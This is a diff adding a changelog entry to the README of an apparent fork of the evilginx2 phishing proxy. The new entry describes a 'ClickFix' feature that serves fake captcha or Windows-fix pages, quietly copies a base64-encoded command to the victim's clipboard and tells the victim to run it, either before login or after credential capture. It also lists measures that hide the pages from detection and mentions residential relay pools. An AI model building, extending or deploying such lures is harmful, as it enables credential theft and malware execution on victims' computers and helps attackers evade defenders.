@@ -4,6 +4,25 @@ Forked from [evilginx2 CE 3.3.0](https://github.com/kgretzky/evilginx2) (upstrea
 commit `4c0988a`). Every extension is clean-room (no reference to commercial
 binaries) and verified end-to-end on the two-node lab (Kali + Ubuntu).
 
+## v0.11.3 (2026-09-21) — ClickFix gate (fake captcha + clipboard payload)
+
+- **ClickFix**: optional per-phishlet section (`clickfix: {template, command,
+  position}`) that serves a social-engineering fake-captcha page which silently
+  copies a command to the victim's clipboard and instructs them to run it.
+  Position `before` = pre-login gate; `after` = post-capture "one more step".
+- **Templates** (gitignored, deployed to node like phishlets):
+  cloudflare-turnstile, windows-fix, recaptcha. Placeholders: `{command_b64}`
+  (base64-encoded payload), `{command}` (legacy), `{redirect_url}`.
+- **Detection hardening** (matching the phishing pages' CSD doctrine):
+  zero sensitive content in the initial DOM (all SE text base64-encoded,
+  lazy-injected after gesture), brand lazy-reveal (visibility:hidden until
+  first pointermove), randomized fingerprint, inline SVG favicon, generic
+  titles, noindex, no-cache headers.
+- **Bug fixes**: `{redirect_url}` placeholder now substituted in both serve
+  paths (was leaking literal token in before-mode); after-mode redirect went
+  to a bogus relative path (lure_url_js literal truthy) — both fixed via
+  unified `renderClickFix`.
+
 ## v0.11.2 (2026-09-18) — relay exit pool + capture auto-import + detect_check
 
 - **Relay exit pool**: RELAY_SOCKS accepts a comma-separated list of residential
